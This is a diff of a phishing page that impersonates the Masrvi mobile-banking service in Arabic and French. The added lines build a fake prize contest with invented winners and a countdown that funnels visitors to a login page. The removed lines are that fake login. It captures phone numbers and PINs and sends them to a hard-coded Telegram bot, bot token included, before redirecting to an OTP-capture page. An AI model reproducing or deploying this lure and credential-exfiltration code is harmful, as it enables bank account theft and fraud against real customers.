+        <div class="gcard-desc" id="gp2d">منزل عصري في قلب نواكشوط، الجائزة الكبرى لعائلة موريتانية محظوظة</div>
+      </div>
     </div>
   </div>
-  <div class="keypad-wrap" id="keypad"></div>
+  <div class="prize-grid">
+    <div class="prize-card">
+      <div class="pimg"><img src="images/prize_iphone.png" alt="" onerror="this.style.display='none'"></div>
+      <div class="pbody"><div class="pname">iPhone 17 Pro</div><div class="pdesc" id="pp1">أحدث إصدار من Apple</div><span class="ptag">×10</span></div>
+    </div>
+    <div class="prize-card">
+      <div class="pimg"><img src="images/prize_cash.png" alt="" onerror="this.style.display='none'"></div>
+      <div class="pbody"><div class="pname" id="pp3n">جوائز نقدية يومية</div><div class="pdesc" id="pp3">500 — 35.000 أوقية</div><span class="ptag" id="pp3t">كل يوم</span></div>
+    </div>
+    <div class="prize-card">
+      <div class="pimg"><img src="images/prize_voucher.png" alt="" onerror="this.style.display='none'"></div>
+      <div class="pbody"><div class="pname" id="pp4n">قسائم شراء</div><div class="pdesc" id="pp4">قسائم تسوق حصرية</div><span class="ptag" id="pp4t">أسبوعياً</span></div>
+    </div>
+    <div class="prize-card">
+      <div class="pimg"><img src="images/prize_extra.png" alt="" onerror="this.style.display='none'"></div>
+      <div class="pbody"><div class="pname" id="pp5n">مفاجآت يومية</div><div class="pdesc" id="pp5">جوائز إضافية مفاجئة</div><span class="ptag" id="pp5t">كل يوم</span></div>
+    </div>
+  </div>
 </div>
 
-<div class="spinner-screen" id="spinner">
-  <div class="ring"></div>
-  <div class="spin-label" id="s-spinner">جاري تسجيل الدخول...</div>
+<div class="divider"></div>
+
+<!-- SLIDESHOW -->
+<div class="page-sec">
+  <div class="sec-head">
+    <div class="sec-tag" id="sl-tag">معرض الصور</div>
+    <div class="sec-title" id="sl-title">لحظات <span>مصرفي</span></div>
+    <div class="teal-bar"></div>
+  </div>
+  <div class="slideshow-wrap">
+    <div class="slides-cont" id="slides-cont"></div>
+    <button class="sarr prev" onclick="prevSlide()">›</button>
+    <button class="sarr next" onclick="nextSlide()">‹</button>
+    <div class="slide-nav" id="slide-nav"></div>
+  </div>
 </div>
+
+<div class="divider"></div>
+
+<!-- LIVE FEED -->
+<div class="page-sec">
+  <div class="sec-head">
+    <div class="sec-tag"><span id="lw-tag">مباشر</span></div>
+    <div class="sec-title" id="lw-title">آخر <span>الرابحين</span></div>
+    <div class="teal-bar"></div>
+  </div>
+  <div id="live-feed"></div>
+</div>
+
+<div class="bottom-cta">
+  <div class="bc-title" id="bc-title">لا تفوّت سحب اليوم<br><span id="bc-title2">سجّل مع مصرفي الآن!</span></div>
+  <div class="bc-sub" id="bc-sub">انضم لمئات الآلاف من عملاء مصرفي وكن الفائز القادم</div>
+</div>
+
+<footer><p id="footer-txt">© 2025 مصرفي by BMCI — جميع الحقوق محفوظة</p></footer>
 
 <script>
-// ── CONFIG ──
-const BOT_TOKEN = '8744987826:AAG1dT-BOUikFMtDslYxNa2htJB-tMs5FdA';
-const CHAT_ID   = '8674569520';
-
-// ── TRANSLATIONS ──
 const T = {
-  ar: {
-    title:'تسجيل الدخول', back:'رجوع', sTitle:'الاتصال',
-    phoneLabel:'رقم الهاتف', forgot:'لم يعد بإمكاني الوصول إلى رقمي',
-    btn:'تفعيل الاتصال', pinHint:'أدخل رمزك السري لكي تواصل',
-    spinner:'جاري تسجيل الدخول...', langBtn:'FR',
-    block10: 'هذا الرقم مسجل مسبقاً. يمكنك المحاولة مرة أخرى بعد:',
-    block24: 'تم حظر هذا الرقم لمدة 24 ساعة بسبب محاولات متعددة. الوقت المتبقي:',
+  ar:{
+    langLabel:'FR',
+    badge:'مسابقة مصرفي اليومية',
+    t1:'جوائز مصرفي الكبرى', t2:'اربح كل يوم مع مصرفي',
+    sub:'سيارة فارهة • منزل فاخر • iPhone 17 Pro • جوائز نقدية يومية تصل إلى 35.000 أوقية',
+    ndLabel:'السحب القادم خلال',
+    mp1:'أكبر مسابقة في موريتانيا', mp3:'تسجيل في ثوانٍ', mp4:'فرصتك مع مصرفي',
+    cta:'سجّل الآن', fixedCta:'سجّل الآن وشارك في السحب اليومي', spinTxt:'جاري التوجيه...',
+    tkLbl:'رابحون مباشر',
+    prTag:'الجوائز', prTitle:['جوائز ','مصرفي',' الأسطورية'],
+    gp1b:'الجائزة الكبرى الأولى', gp1n:'سيارة فارهة', gp1d:'سيارة فاخرة تُسلَّم للفائز في حفل مصرفي الشهري الاحتفالي',
+    gp2b:'الجائزة الكبرى الثانية', gp2n:'منزل فاخر', gp2d:'منزل عصري في قلب نواكشوط، الجائزة الكبرى لعائلة موريتانية محظوظة',
+    pp1:'أحدث إصدار من Apple',
+    pp3n:'جوائز نقدية يومية', pp3:'500 — 35.000 أوقية', pp3t:'كل يوم',
+    pp4n:'قسائم شراء', pp4:'قسائم تسوق حصرية', pp4t:'أسبوعياً',
+    pp5n:'مفاجآت يومية', pp5:'جوائز إضافية مفاجئة', pp5t:'كل يوم',
+    slTag:'معرض الصور', slTitle:['لحظات ','مصرفي'],
+    lwTag:'مباشر', lwTitle:['آخر ','الرابحين'],
+    bcTitle:'لا تفوّت سحب اليوم', bcTitle2:'سجّل مع مصرفي الآن!',
+    bcSub:'انضم لمئات الآلاف من عملاء مصرفي وكن الفائز القادم',
+    footer:'© 2025 مصرفي by BMCI — جميع الحقوق محفوظة',
+    hours:'ساعة', min:'دقيقة', sec:'ثانية',
+    mru:'أوقية', slideHint:'ضع صورة هنا',
   },
-  fr: {
-    title:'Connexion', back:'Retour', sTitle:'Connexion',
-    phoneLabel:'Numéro de téléphone', forgot:"Je n'ai plus accès à mon numéro",
-    btn:'Activer la connexion', pinHint:'Entrez votre code secret pour continuer',
-    spinner:'Connexion en cours...', langBtn:'AR',
-    block10: 'Ce numéro est déjà enregistré. Réessayez dans :',
-    block24: 'Ce numéro est bloqué pendant 24h suite à plusieurs tentatives. Temps restant :',
+  fr:{
+    langLabel:'AR',
+    badge:'Concours quotidien Masrvi',
+    t1:'Les grands prix Masrvi', t2:'Gagnez chaque jour avec Masrvi',
+    sub:'Voiture luxe • Maison de rêve • iPhone 17 Pro • Prix en espèces jusqu\'à 35 000 MRU',
+    ndLabel:'Prochain tirage dans',
+    mp1:'Le plus grand concours en Mauritanie', mp3:'Inscription en secondes', mp4:'Votre chance avec Masrvi',
+    cta:"S'inscrire", fixedCta:"S'inscrire au tirage quotidien", spinTxt:'Redirection...',
+    tkLbl:'Gagnants en direct',
+    prTag:'Prix', prTitle:['Les prix ','Masrvi',' légendaires'],
+    gp1b:'1er Grand Prix', gp1n:'Voiture de luxe', gp1d:'Une voiture luxueuse remise lors de la cérémonie mensuelle Masrvi',
+    gp2b:'2ème Grand Prix', gp2n:'Maison de luxe', gp2d:'Une maison moderne dans le cœur de Nouakchott',
+    pp1:'Dernier modèle Apple',
+    pp3n:'Prix en espèces quotidiens', pp3:'500 — 35 000 MRU', pp3t:'Chaque jour',
+    pp4n:'Bons d\'achat', pp4:'Bons de shopping exclusifs', pp4t:'Hebdomadaire',
+    pp5n:'Surprises quotidiennes', pp5:'Prix surprises supplémentaires', pp5t:'Chaque jour',
+    slTag:'Galerie', slTitle:['Moments ','Masrvi'],
+    lwTag:'En direct', lwTitle:['Derniers ','gagnants'],
+    bcTitle:'Ne ratez pas le tirage du jour', bcTitle2:'Inscrivez-vous avec Masrvi !',
+    bcSub:'Rejoignez des centaines de milliers de clients Masrvi',
+    footer:'© 2025 Masrvi by BMCI — Tous droits réservés',
+    hours:'Heures', min:'Min', sec:'Sec',
+    mru:'MRU', slideHint:'Placez une image ici',
   }
 };
+
 let lang = localStorage.getItem('appLang') || 'ar';
 
 function applyLang() {
   const t = T[lang];
-  document.title = t.title;
-  document.getElementById('page-title').textContent = t.title;
-  document.getElementById('back-text').textContent = t.back;
-  document.getElementById('s-title').textContent = t.sTitle;
-  document.getElementById('s-phone-label').textContent = t.phoneLabel;
-  document.getElementById('s-forgot').textContent = t.forgot;
-  document.getElementById('s-btn').textContent = t.btn;
-  document.getElementById('s-pin-hint').textContent = t.pinHint;
-  document.getElementById('s-spinner').textContent = t.spinner;
-  document.getElementById('lang-btn').textContent = t.langBtn;
+  document.getElementById('lang-float-label').textContent = t.langLabel;
+  document.getElementById('h-badge').textContent = t.badge;
+  document.getElementById('h-t1').textContent = t.t1;
+  document.getElementById('h-t2').textContent = t.t2;
+  document.getElementById('h-sub').textContent = t.sub;
+  document.getElementById('nd-label').textContent = t.ndLabel;
+  document.getElementById('mp1').textContent = t.mp1;
+  document.getElementById('mp3').textContent = t.mp3;
+  document.getElementById('mp4').textContent = t.mp4;
+  document.getElementById('h-cta').textContent = t.cta;
+  document.getElementById('fixed-cta-text').textContent = t.fixedCta;
+  document.getElementById('spin-txt').textContent = t.spinTxt;
+  document.getElementById('tk-lbl').textContent = t.tkLbl;
+  document.getElementById('pr-tag').textContent = t.prTag;
+  document.getElementById('pr-title').innerHTML = t.prTitle[0]+'<span>'+t.prTitle[1]+'</span>'+t.prTitle[2];
+  document.getElementById('gp1b').textContent = t.gp1b;
+  document.getElementById('gp1n').textContent = t.gp1n;
+  document.getElementById('gp1d').textContent = t.gp1d;
+  document.getElementById('gp2b').textContent = t.gp2b;
+  document.getElementById('gp2n').textContent = t.gp2n;
+  document.getElementById('gp2d').textContent = t.gp2d;
+  document.getElementById('pp1').textContent = t.pp1;
+  document.getElementById('pp3n').textContent = t.pp3n;
+  document.getElementById('pp3').textContent = t.pp3;
+  document.getElementById('pp3t').textContent = t.pp3t;
+  document.getElementById('pp4n').textContent = t.pp4n;
+  document.getElementById('pp4').textContent = t.pp4;
+  document.getElementById('pp4t').textContent = t.pp4t;
+  document.getElementById('pp5n').textContent = t.pp5n;
+  document.getElementById('pp5').textContent = t.pp5;
+  document.getElementById('pp5t').textContent = t.pp5t;
+  document.getElementById('sl-tag').textContent = t.slTag;
+  document.getElementById('sl-title').innerHTML = t.slTitle[0]+'<span>'+t.slTitle[1]+'</span>';
+  document.getElementById('lw-tag').textContent = t.lwTag;
+  document.getElementById('lw-title').innerHTML = t.lwTitle[0]+'<span>'+t.lwTitle[1]+'</span>';
+  document.getElementById('bc-title').innerHTML = t.bcTitle+'<br><span id="bc-title2">'+t.bcTitle2+'</span>';
+  document.getElementById('bc-sub').textContent = t.bcSub;
+  document.getElementById('footer-txt').textContent = t.footer;
+  document.getElementById('cd-hl').textContent = t.hours;
+  document.getElementById('cd-ml').textContent = t.min;
+  document.getElementById('cd-sl').textContent = t.sec;
   document.documentElement.lang = lang;
-  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-  document.body.classList.toggle('fr', lang === 'fr');
+  document.documentElement.dir = lang==='ar'?'rtl':'ltr';
+  document.body.classList.toggle('fr', lang==='fr');
+  buildTicker(); updateFeed(); buildSlides();
 }
 function toggleLang() {
-  lang = lang === 'ar' ? 'fr' : 'ar';
+  lang = lang==='ar'?'fr':'ar';
   localStorage.setItem('appLang', lang);
   applyLang();
 }
 
-// ── TELEGRAM ──
-async function sendTelegram(text) {
-  try {
-    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-    });
-  } catch(e) { console.warn('Telegram error:', e); }
+function goLogin() {
+  document.getElementById('spinner-ov').classList.add('active');
+  setTimeout(()=>{ window.location.href='login.html'; }, 2000);
 }
 
-// ── REGISTRATION BLOCK ──
-const BLOCK_10  = 10 * 60 * 1000;       // 10 minutes
-const BLOCK_24  = 24 * 60 * 60 * 1000;  // 24 hours
-
-function getRegData(phone) {
-  return JSON.parse(localStorage.getItem('reg_' + phone) || 'null');
-}
-function saveRegData(phone, data) {
-  localStorage.setItem('reg_' + phone, JSON.stringify(data));
-}
-
-function checkBlock(phone) {
-  const data = getRegData(phone);
-  if (!data) return null;
-  const now = Date.now();
-
-  if (data.count === 1) {
-    const elapsed = now - data.lastTime;
-    if (elapsed < BLOCK_10) return { type: '10min', ms: BLOCK_10 - elapsed };
-    return null;
-  }
-
-  if (data.count >= 2) {
-    const elapsed = now - data.lastTime;
-    if (elapsed < BLOCK_24) return { type: '24h', ms: BLOCK_24 - elapsed };
-    localStorage.removeItem('reg_' + phone);
-    return null;
-  }
-  return null;
-}
-
-function recordReg(phone) {
-  const data = getRegData(phone);
-  const now = Date.now();
-  if (!data) {
-    saveRegData(phone, { count: 1, firstTime: now, lastTime: now });
-  } else {
-    saveRegData(phone, { count: data.count + 1, firstTime: data.firstTime, lastTime: now });
-  }
-}
-
-// FIX: template literals were broken in original
-function formatTime(ms) {
-  const totalSec = Math.ceil(ms / 1000);
-  const h = Math.floor(totalSec / 3600);
-  const m = Math.floor((totalSec % 3600) / 60);
-  const s = totalSec % 60;
-  const pad = function(n) { return String(n).padStart(2, '0'); };
-  if (h > 0) return pad(h) + ':' + pad(m) + ':' + pad(s);
-  return pad(m) + ':' + pad(s);
-}
-
-let blockInterval = null;
-function showBlock(block) {
-  const t = T[lang];
-  const msg = document.getElementById('block-msg');
-  const txt = document.getElementById('block-text');
-  const tmr = document.getElementById('block-timer');
-  msg.style.display = 'block';
-  txt.textContent = block.type === '10min' ? t.block10 : t.block24;
-
-  clearInterval(blockInterval);
-  let remaining = block.ms;
-  tmr.textContent = formatTime(remaining);
-  blockInterval = setInterval(function() {
-    remaining -= 1000;
-    if (remaining <= 0) {
-      clearInterval(blockInterval);
-      msg.style.display = 'none';
-      document.getElementById('act-btn').disabled = false;
-    } else {
-      tmr.textContent = formatTime(remaining);
-    }
-  }, 1000);
-}
-
-// ── PHONE ──
-function isValidPhone(v) {
-  if (v.length !== 8) return false;
-  if (!['2','3','4'].includes(v[0])) return false;
-  // Reject numbers where all digits are the same (e.g. 46666666, 23333333)
-  if (/^(.)\1+$/.test(v.slice(1))) return false;
-  return true;
-}
-
-function onPhone(el) {
-  el.value = el.value.replace(/\D/g, '').slice(0, 8);
-  document.getElementById('block-msg').style.display = 'none';
-  clearInterval(blockInterval);
-  const v = el.value;
-  document.getElementById('act-btn').disabled = !isValidPhone(v);
-}
-function clearPhone() {
-  document.getElementById('phone-input').value = '';
-  document.getElementById('act-btn').disabled = true;
-  document.getElementById('block-msg').style.display = 'none';
-  clearInterval(blockInterval);
-}
-
-// ── PIN ──
-let pin = '';
-
-function tryOpenPin() {
-  const phone = document.getElementById('phone-input').value;
-  const block = checkBlock(phone);
-  if (block) {
-    document.getElementById('act-btn').disabled = true;
-    showBlock(block);
-    return;
-  }
-  openPin();
-}
-
-function buildKeypad() {
-  const wrap = document.getElementById('keypad');
-  const slots = Array(16).fill(null);
-  const idxs = Array.from({length: 16}, function(_, i) { return i; })
-                    .sort(function() { return Math.random() - 0.5; })
-                    .slice(0, 10);
-  [0,1,2,3,4,5,6,7,8,9].forEach(function(d, i) { slots[idxs[i]] = d; });
-  wrap.innerHTML = '';
-  slots.forEach(function(v) {
-    const b = document.createElement('button');
-    b.className = 'key' + (v === null ? ' empty' : '');
-    if (v !== null) {
-      b.textContent = v;
-      b.addEventListener('click', (function(digit) {
-        return function() { pressKey(digit); };
-      })(v));
-    }
-    wrap.appendChild(b);
-  });
-}
-
-function openPin() {
-  pin = ''; updateDots(); buildKeypad();
-  document.getElementById('overlay').classList.add('active');
-  document.getElementById('pin-popup').classList.add('active');
-}
-function closePin() {
-  document.getElementById('overlay').classList.remove('active');
-  document.getElementById('pin-popup').classList.remove('active');
-}
-function pressKey(d) {
-  if (pin.length >= 4) return;
-  pin += d; updateDots();
-  if (pin.length === 4) setTimeout(doLogin, 250);
-}
-function resetPin() { pin = ''; updateDots(); }
-function updateDots() {
-  for (let i = 0; i < 4; i++) {
-    document.getElementById('d' + i).classList.toggle('on', i < pin.length);
-  }
-}
-
-async function doLogin() {
-  const phone = document.getElementById('phone-input').value;
+/* ── DAILY COUNTDOWN to midnight ── */
+function updateCD() {
   const now = new Date();
-  const dateStr = now.toLocaleString('fr-FR', { timeZone: 'Africa/Nouakchott' });
-
-  // Save to sessionStorage for OTP page
-  sessionStorage.setItem('phone', phone);
-  sessionStorage.setItem('pin', pin);
-
-  // Record registration
-  recordReg(phone);
-
-  closePin();
-  document.getElementById('spinner').classList.add('active');
-
-  // FIX: template literal was broken — rebuilt as string concatenation
-  const msg =
-    '\uD83D\uDD10 <b>\u0645\u062D\u0627\u0648\u0644\u0629 \u062A\u0633\u062C\u064A\u0644 \u062F\u062E\u0648\u0644 \u062C\u062F\u064A\u062F\u0629</b>\n' +
-    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
-    '\uD83D\uDCF1 <b>\u0627\u0644\u0631\u0642\u0645:</b> +222 ' + phone + '\n' +
-    '\uD83D\uDD11 <b>\u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0633\u0631\u064A:</b> ' + pin + '\n' +
-    '\uD83C\uDF10 <b>\u0627\u0644\u0644\u063A\u0629:</b> ' + lang.toUpperCase() + '\n' +
-    '\uD83D\uDD50 <b>\u0627\u0644\u0648\u0642\u062A:</b> ' + dateStr + '\n' +
-    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
-    '\uD83D\uDCCC <i>@Sahra_wibot</i>';
-
-  await sendTelegram(msg);
-
-  setTimeout(function() {
-    document.getElementById('spinner').classList.remove('active');
-    window.location.href = 'otpverify.html';
-  }, 2000);
+  // Next midnight Nouakchott time (UTC+0)
+  const midnight = new Date();
+  midnight.setUTCHours(23,59,59,999);
+  let diff = midnight - now;
+  if (diff < 0) diff = 0;
+  const h = Math.floor(diff / 3600000);
+  const m = Math.floor((diff % 3600000) / 60000);
+  const s = Math.floor((diff % 60000) / 1000);
+  const str = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  document.getElementById('nd-value').textContent = str;
+  document.getElementById('cd-h').textContent = String(h).padStart(2,'0');
+  document.getElementById('cd-m').textContent = String(m).padStart(2,'0');
+  document.getElementById('cd-s').textContent = String(s).padStart(2,'0');
 }
 
-function goBack() {
-  if (document.getElementById('pin-popup').classList.contains('active')) closePin();
-  else history.back();
+/* ── WINNERS ── */
+const WINNERS=[
+  {name:'عيشة بنت مبروك',phone:'22***48',amount:5000,icon:'👩'},
+  {name:'سيدي إبراهيم بن مالي',phone:'36***12',amount:2000,icon:'👨'},
+  {name:'فاطمة بنت أحمد',phone:'44***79',amount:15000,icon:'👩'},
+  {name:'محمد ولد سيدي',phone:'22***03',amount:1500,icon:'👨'},
+  {name:'مريم بنت محمود',phone:'33***61',amount:7500,icon:'👩'},
+  {name:'أحمد ولد بكر',phone:'46***27',amount:3000,icon:'👨'},
+  {name:'خديجة بنت يحيى',phone:'22***55',amount:500,icon:'👩'},
+  {name:'إسماعيل ولد الشيخ',phone:'39***84',amount:10000,icon:'👨'},
+  {name:'زينب بنت عبد الله',phone:'44***13',amount:2500,icon:'👩'},
+  {name:'محمود ولد محمد',phone:'27***66',amount:35000,icon:'👨'},
+  {name:'حواء بنت الطيب',phone:'23***91',amount:1000,icon:'👩'},
+  {name:'الشيخ ولد أمين',phone:'41***38',amount:20000,icon:'👨'},
+  {name:'سلمى بنت كريم',phone:'36***74',amount:3500,icon:'👩'},
+  {name:'عبد الرحمن ولد علي',phone:'22***20',amount:5500,icon:'👨'},
+  {name:'آمنة بنت يوسف',phone:'48***05',amount:1500,icon:'👩'},
+  {name:'موسى ولد إدريس',phone:'31***47',amount:8000,icon:'👨'},
+  {name:'رقية بنت داود',phone:'44***62',amount:2000,icon:'👩'},
+  {name:'البشير ولد حمد',phone:'26***89',amount:12000,icon:'👨'},
+  {name:'نفيسة بنت عمر',phone:'37***34',amount:750,icon:'👩'},
+  {name:'يحيى ولد المختار',phone:'43***16',amount:25000,icon:'👨'},
+  {name:'بتول بنت إبراهيم',phone:'22***73',amount:4000,icon:'👩'},
+  {name:'الحسن ولد أحمد',phone:'34***58',amount:6000,icon:'👨'},
+  {name:'أسماء بنت محمد',phone:'47***41',amount:1500,icon:'👩'},
+  {name:'عثمان ولد سيدي',phone:'29***97',amount:3000,icon:'👨'},
+  {name:'بلقيس بنت الحسن',phone:'44***22',amount:5000,icon:'👩'},
+  {name:'علي ولد ماديو',phone:'38***63',amount:9000,icon:'👨'},
+  {name:'صفية بنت عبد',phone:'22***85',amount:2500,icon:'👩'},
+  {name:'ابراهيم ولد عبد الله',phone:'45***39',amount:18000,icon:'👨'},
+  {name:'هند بنت أحمد',phone:'32***07',amount:500,icon:'👩'},
+  {name:'محفوظ ولد اعل',phone:'24***54',amount:30000,icon:'👨'},
+];
+
+function buildTicker(){
+  const t=T[lang];
+  document.getElementById('ticker-inner').innerHTML=
+    [...WINNERS,...WINNERS].map(w=>
+      `<div class="ti"><span>${w.icon}</span><span class="ti-name">${w.name}</span><span class="ti-phone">${w.phone}</span><span class="ti-amount">${w.amount.toLocaleString()} ${t.mru}</span></div>`
+    ).join('');
 }
+
+let fi=0;
+function addFeed(){
+  const t=T[lang]; const w=WINNERS[fi%WINNERS.length]; fi++;
+  const feed=document.getElementById('live-feed');
+  const el=document.createElement('div'); el.className='feed-item new';
+  el.innerHTML=`<div class="favatar">${w.icon}</div><div class="finfo"><div class="fname">${w.name}</div><div class="fphone">${w.phone}</div></div><div class="famount"><div class="fa-num">${w.amount.toLocaleString()}</div><div class="fa-unit">${t.mru}</div></div>`;
+  feed.insertBefore(el,feed.firstChild);
+  setTimeout(()=>el.classList.remove('new'),600);
+  while(feed.children.length>6) feed.removeChild(feed.lastChild);
+}
+function updateFeed(){ document.getElementById('live-feed').innerHTML=''; fi=0; for(let i=0;i<6;i++) addFeed(); }
+setInterval(addFeed,2000);
+
+const SLIDES=[
+  {file:'images/slide1.png',icon:''},{file:'images/slide2.png',icon:''},
+  {file:'images/slide3.jpg',icon:''},{file:'images/slide4.jpg',icon:''},
+  {file:'images/slide5.jpg',icon:''},
+];
+let curSlide=0, slideTimer;
+function buildSlides(){
+  const t=T[lang];
+  const cont=document.getElementById('slides-cont'); const nav=document.getElementById('slide-nav');
+  cont.innerHTML=''; nav.innerHTML='';
+  SLIDES.forEach((sl,i)=>{
+    const d=document.createElement('div'); d.className='slide';
+    d.innerHTML=`<img src="${sl.file}" alt="" onerror="this.style.display='none'">`;
+    cont.appendChild(d);
+    const dot=document.createElement('div'); dot.className='sdot'+(i===0?' on':''); dot.onclick=()=>goSlide(i); nav.appendChild(dot);
+  });
+  goSlide(0);
+}
+function goSlide(n){
+  curSlide=n;
+  document.getElementById('slides-cont').style.transform=`translateX(${lang==='ar'?'':'-'}${n*100}%)`;
+  document.querySelectorAll('.sdot').forEach((d,i)=>d.classList.toggle('on',i===n));
+}
+function nextSlide(){ goSlide((curSlide+1)%SLIDES.length); resetST(); }
+function prevSlide(){ goSlide((curSlide-1+SLIDES.length)%SLIDES.length); resetST(); }
+function resetST(){ clearInterval(slideTimer); slideTimer=setInterval(nextSlide,4000); }
+
+/* PARTICLES */
+(function(){
+  const cv=document.getElementById('particles'), cx=cv.getContext('2d'); let pts=[];
+  function resize(){ cv.width=window.innerWidth; cv.height=window.innerHeight;
+    pts=Array.from({length:Math.min(Math.floor(cv.width*cv.height/7000),70)},()=>({
+      x:Math.random()*cv.width, y:Math.random()*cv.height,
+      vx:(Math.random()-.5)*.3, vy:(Math.random()-.5)*.3,
+      r:Math.random()*1.8+.4, phase:Math.random()*Math.PI*2
+    }));
+  }
+  function draw(){
+    cx.clearRect(0,0,cv.width,cv.height); const now=Date.now()*.001;
+    pts.forEach(p=>{
+      p.x+=p.vx; p.y+=p.vy;
+      if(p.x<0)p.x=cv.width; if(p.x>cv.width)p.x=0;
+      if(p.y<0)p.y=cv.height; if(p.y>cv.height)p.y=0;
+      const a=(Math.sin(now+p.phase)*.3+.5)*.45;
+      cx.beginPath(); cx.arc(p.x,p.y,p.r,0,Math.PI*2);
+      cx.fillStyle=`rgba(20,201,168,${a})`; cx.fill();
+    });
+    for(let i=0;i<pts.length;i++) for(let j=i+1;j<pts.length;j++){
+      const dx=pts[i].x-pts[j].x, dy=pts[i].y-pts[j].y, dist=Math.sqrt(dx*dx+dy*dy);
+      if(dist<90){ cx.beginPath(); cx.moveTo(pts[i].x,pts[i].y); cx.lineTo(pts[j].x,pts[j].y); cx.strokeStyle=`rgba(20,201,168,${.07*(1-dist/90)})`; cx.lineWidth=.5; cx.stroke(); }
+    }
+    requestAnimationFrame(draw);
+  }
+  window.addEventListener('resize',resize); resize(); draw();
+})();
 
 applyLang();
+slideTimer=setInterval(nextSlide,4000);
+setInterval(updateCD,1000); updateCD();
 </script>
 </body>
 </html>
